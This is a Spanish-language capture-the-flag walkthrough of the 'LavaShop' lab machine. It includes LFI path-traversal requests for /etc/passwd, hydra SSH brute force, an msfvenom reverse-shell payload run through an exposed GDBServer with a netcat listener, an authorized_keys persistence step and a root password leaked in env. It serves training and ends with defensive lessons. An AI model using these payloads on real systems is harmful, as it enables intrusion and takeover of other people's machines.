# LavaShop

<img width="1348" height="629" alt="image" src="https://github.com/user-attachments/assets/0094e71e-1103-4f90-9d10-731b645bb4f6" />

**Plataforma:** The Hackers Labs  
**Dificultad:** Fácil  
**OS:** Linux  
**Fecha:** 21/07/2026

## 0. Resumen

Máquina Linux fácil que simula una tienda online de lámparas de lava

El camino de explotación combina:
- Enumeración de usuarios mediante Local File Inclusion (LFI)
- Fuerza bruta SSH para el acceso inicial
- Explotación de GDBServer expuesto
- Escalada a root por filtración de credenciales

## 1. Reconocimiento

   Ping
   
```bash
ping -c 2 10.0.2.19
```

<img width="1300" height="143" alt="image" src="https://github.com/user-attachments/assets/26b5d423-f5e9-4d0d-82d8-af363ed4e2ab" />

→ TTL=64 sugiere que se trata de un host Linux

   Nmap
   
```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 <IP> -oA lavashop
```

| Orden | Función |
|---|---|
| `-sCV` | Ejecución de Scripts y detección de Versión de servicios |
| `-Pn` |  Omite descubrimiento de host |
| `-n` | Sin resolución de DNS |
| `--open` | Muestra únicamente puertos abiertos |
| `-p-` | Escanea todos los puertos (65535) |
| `--min-rate` | Acelera escaneo enviando 5000 paquetes por segundo |
| `-oA` | Output en todos los formatos (.namp, .xml, .gnmap) |


**Resultados:**

- Puerto 22: OpenSSH 9.2p1 (Debian 12)
  
- Puerto 80: Apache 2.4.62, redirige a `lavashop.thl`
  
- Puerto 1337: servicio sin identificar

### 2. Configuración de DNS local

```bash
echo "<IP> lavashop.thl" | sudo tee -a /etc/hosts
```

## 3. Enumeración WEB

<img width="1897" height="574" alt="image" src="https://github.com/user-attachments/assets/f1ebdbcc-a1e0-4454-9eec-98efa60f2f1a" />

### 3.1 Exploración manual

La web usa un parámetro GET `page` para navegar (`?page=products`, `?page=about`, etc.). Esto sugiere una posible inclusión de archivos del lado del servidor.

### 3.2 Fuzzing de directorios

```bash
gobuster dir -u http://lavashop.thl/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```

| Orden | Función |
|---|---|
| `-u` | URL |
| `-P` | Diccionario con contraseñas comunes |
| `-x` | Extensión de archivos |

<img width="1180" height="227" alt="image" src="https://github.com/user-attachments/assets/cbf9c6e1-1271-46ec-bfb6-5ac2355d1d2b" />

Directorios de interés: `/pages/`, `/assets/`, `/includes/`

### 3.3 Enumeración recursiva de /pages/

```bash
gobuster dir -u http://lavashop.thl/pages -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```

<img width="1304" height="206" alt="image" src="https://github.com/user-attachments/assets/7398dc5f-1de3-4a4a-9465-3a88a3e53576" />

Archivos de interés: `about.php`, `contact.php`, `products.php` y `home.php`

## 4. Explotación — LFI Manual

### 4.1 Intentos fallidos sobre index.php

```bash
curl "http://lavashop.thl/index.php?page=../../../../etc/passwd"

curl "http://lavashop.thl/index.php?page=....//....//....//etc/passwd"

curl "http://lavashop.thl/index.php?page=../../../etc/passwd%00"
```

→ Todos devuelven 404 (hay validación/filtrado sobre `page`)

### 4.2 Fuzzing de parámetros ocultos

```bash
ffuf -u "http://lavashop.thl/pages/products.php?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1017
```

| Orden | Función |
|---|---|
| `-u` | URL |
| `-w` | Diccionario con nombres de parámetros comunes |
| `-fs` | Filtro de respuesta |

<img width="1291" height="287" alt="image" src="https://github.com/user-attachments/assets/a2d5aa36-25a6-4ec6-83d1-d04737cfd120" />

→ Parámetro descubierto: `file`

### 4.3 LFI

Prueba de parámetro `file` con path traversal para enumerar usuarios

```bash
curl "http://lavashop.thl/pages/products.php?file=../../../../etc/passwd" | grep -E "/bin/bash|/bin/sh"
```

<img width="1261" height="64" alt="image" src="https://github.com/user-attachments/assets/d2c5d096-656e-480c-b3c6-b219aa40a193" />

→ Revela usuarios `debian` (UID 1000) y `Rodri` (UID 1001), ambos con shell /bin/bashy login interactivo

## 5. Acceso Inicial — Fuerza Bruta SSH

```bash
hydra -l debian -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

| Orden | Función |
|---|---|
| `-l` | Nombre de usuario |
| `-P` | Diccionario con contraseñas comunes |
| `-ssh` | Número de tareas simultáneas |

<img width="1194" height="224" alt="image" src="https://github.com/user-attachments/assets/bc2a6ecb-5d0b-4f1b-b9bf-cb6a8d966b11" />

→ Credenciales válidas: **`Debian : 12345`**

```bash
ssh debian@<IP>
```

## 6. Escalada de privilegios — GDBServer

### 6.1 Enumeración
```bash
sudo -l: no permitido
su:      requiere contraseña de root
ps -aux | grep 1337
```

<img width="1323" height="59" alt="image" src="https://github.com/user-attachments/assets/2c49cba1-7fb9-438d-a5a9-9838c351c629" />

→ GDBServer corriendo como `Rodri`, escuchando en `0.0.0.0:1337`, con flag `--once`

GDBServer permite depuración remota

Si es accesible sin restricciones, un atacante puede subir un binario y ejecutarlo con los privilegios del usuario que lo ejecuta

### 6.2 Generar payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf
```

| Orden | Función |
|---|---|
| `-p` | Payload a emplear |
| `-LHOST` | IP máquina atacante |
| `-LPORT` | Puerto máquina atacante |
| `-PrependFork` | Hace fork antes de ejecutar shell para evitar cuelgu |
| `-f` | Formato de salida de archivo |
| `-o` | Output |

### 6.3 Explotar GDBServer

```bash
gdb binary.elf
```

## Dentro de GDB:

```bash
target extended-remote 10.0.2.19:1337 (IP y puerto de máquina víctima)

remote put binary.elf binary.elf (subida de archivo a /home/Rodri)

set remote exec-file /home/Rodri/binary.elf (archivo a ejecutar)

run (lanzar)
```

### 6.4 Listener (antes de ejecutar `run`)

```bash
nc -lvnp 4444
```

→ Se lanza con run y se obtiene la shell como `Rodri`

### 6.5 Mejorar la shell (TTY)

```bash
SHELL=/bin/bash script -q /dev/null

^Z

stty raw -echo && fg

reset

export TERM=xterm

export SHELL=/bin/bash

stty rows 38 columns 116
```

## 6.5 Acceso SSH Estable como Rodri

En la víctima:

```bash
cd /home/Rodri

mkdir -p .ssh

chmod 700 .ssh
```

En atacante:

```bash
ssh-keygen -t rsa -f rodri_key

cat rodri_key.pub
```

De nuevo en la víctima:

```bash
echo "CLAVE_PÚBLICA" > /home/Rodri/.ssh/authorized_keys

chmod 600 /home/Rodri/.ssh/authorized_keys
```

Conexión:

```bash
ssh -i rodri_key Rodri@<IP>
```

### 7 Escalada a root - Enumerar variables de entorno

```bash
env
```

<img width="1275" height="564" alt="image" src="https://github.com/user-attachments/assets/a4c3c2ac-2053-4698-a5d3-7cff0a988f33" />

→ Variable `env` contiene la contraseña filtrada de `root : lalocadelaslamparas`

### 7.1 Escalada a root

```bash
su root
```
<img width="1091" height="56" alt="image" src="https://github.com/user-attachments/assets/9b63dd39-71b7-4efd-9e8f-1a82c6544a62" />

## 7.2 Primera flag (Rodri)

`cat /home/Rodri/user.txt`

## 7.3 Segunda flag (root)

`cat /root/root.txt`

## 8. Lecciones aprendidas

<img width="1267" height="531" alt="image" src="https://github.com/user-attachments/assets/2f5c5d62-92ab-4c2f-9a03-1ed701b384d1" />

- Los parámetros de archivos individuales deben auditarse en busca de LFI
  
- Servicios de depuración remota (GDBServer) expuestos sin autenticación son un vector crítico de RCE
  
- Las variables de entorno pueden filtrar credenciales sensibles. Se debe revisar siempre `env`, `printenv`, `/proc/*/environ`
